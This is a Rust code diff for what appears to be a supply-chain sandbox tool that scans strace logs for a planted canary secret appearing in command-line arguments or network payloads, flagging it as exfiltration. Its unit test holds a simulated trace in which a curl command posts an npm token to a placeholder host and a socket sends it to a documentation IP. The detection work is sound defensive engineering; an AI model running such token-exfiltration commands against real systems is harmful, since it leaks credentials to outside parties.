@@ -3,6 +3,7 @@
 use std::collections::{BTreeMap, HashMap};
 use std::io::BufRead;
 
+use crate::canary;
 use crate::model::{Behavior, Kind, Phase};
 use crate::rules::{self, norm, WORK};
 use crate::strace::{self, Addr, Call, Parser, Ret};
@@ -99,8 +100,12 @@ impl Extractor {
         let proc = self.proc(call.pid);
         let ok = matches!(call.ret, Ret::Ok(_));
         match call.name.as_str() {
-            "execve" | "execveat" if ok => self.exec(call, &proc),
+            "execve" | "execveat" if ok => {
+                self.secret_in_argv(call, &proc);
+                self.exec(call, &proc)
+            }
             "execve" | "execveat" if call.ret == Ret::Err("ENOENT".into()) => {
+                self.secret_in_argv(call, &proc);
                 if let Some(label) = exec_label(&call.args) {
                     self.missing.insert((call.pid, label), proc.actor);
                 }
@@ -121,6 +126,16 @@ impl Extractor {
             }
             "connect" | "sendto" | "sendmsg" | "sendmmsg" => self.network(call, &proc),
             _ => {}
+        }
+    }
+
+    /// A planted secret on a command line: handed to another program, most
+    /// often a network tool. Counts whether or not that program exists.
+    fn secret_in_argv(&mut self, call: &Call, proc: &Proc) {
+        if self.launched && canary::leaked(&call.args) {
+            if let Some(label) = exec_label(&call.args) {
+                self.record(Kind::Exfil, format!("command line: {label}"), &proc.actor);
+            }
         }
     }
 
@@ -178,7 +193,16 @@ impl Extractor {
     }
 
     fn network(&mut self, call: &Call, proc: &Proc) {
-        match strace::sockaddr(&call.args) {
+        let addr = strace::sockaddr(&call.args);
+        if canary::leaked(&call.args) {
+            let to = match &addr {
+                Some(Addr::Inet { ip, port }) => format!("{ip}:{port}"),
+                Some(Addr::Unix(path)) => format!("unix:{}", norm(path)),
+                None => "a connected socket".to_string(),
+            };
+            self.record(Kind::Exfil, format!("network payload to {to}"), &proc.actor);
+        }
+        match addr {
             Some(Addr::Inet { ip, port }) => {
                 let loopback = ip.starts_with("127.") || ip == "::1" || ip == "::ffff:127.0.0.1";
                 // Loopback 53/80/443 is pkgsnitch's own sinkhole, which logs
@@ -360,6 +384,27 @@ mod tests {
             path_arg(r#"7</opt>, "a", AT_FDCWD</work>, "b""#, "/", usize::MAX).unwrap(),
             "/work/b"
         );
+    }
+
+    #[test]
+    fn planted_secret_leaving_is_exfiltration() {
+        let trace = format!(
+            r#"1  execve("/usr/local/bin/npm", ["npm", "rebuild"], 0x0 /* 3 vars */) = 0
+1  execve("/usr/bin/curl", ["curl", "-d", "t=npm_{c}", "https://x.invalid"], 0x0 /* 3 vars */) = -1 ENOENT (No such file or directory)
+1  sendto(7, "token=npm_{c}", 30, 0, {{sa_family=AF_INET, sin_port=htons(9000), sin_addr=inet_addr("203.0.113.9")}}, 16) = 30
+1  sendto(8, "hello", 5, 0, {{sa_family=AF_INET, sin_port=htons(9001), sin_addr=inet_addr("203.0.113.9")}}, 16) = 5
+"#,
+            c = canary::CANARY
+        );
+        let got = run(&trace);
+        let exfil: Vec<_> = got
+            .iter()
+            .filter(|(kind, _, _)| *kind == Kind::Exfil)
+            .map(|(_, target, _)| target.as_str())
+            .collect();
+        assert_eq!(exfil.len(), 2, "{got:#?}");
+        assert!(exfil.iter().any(|t| t.starts_with("command line: curl -d")));
+        assert!(exfil.contains(&"network payload to 203.0.113.9:9000"));
     }
 
     #[test]
